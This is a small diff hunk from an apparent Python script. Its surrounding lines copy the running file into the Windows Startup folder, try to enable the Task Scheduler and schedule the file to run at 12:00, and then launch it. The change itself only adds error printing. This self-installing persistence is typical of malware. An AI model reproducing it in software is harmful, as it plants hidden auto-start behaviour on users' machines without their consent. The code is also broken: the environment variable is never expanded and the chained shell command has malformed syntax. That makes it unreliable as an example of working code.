@@ -28,6 +28,8 @@ try:
         new_path = '%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\{0}'.format(filename)
         shutil.copy(filename, new_path)
         os.system('sc config schedule start=auto;net start schedule at 12:00 \"\"{0}\"\"'.format(new_path))
+except Exception as error:
+    print(error)
         
 # Run:
 subprocess.Popen(args="", executable=filename)
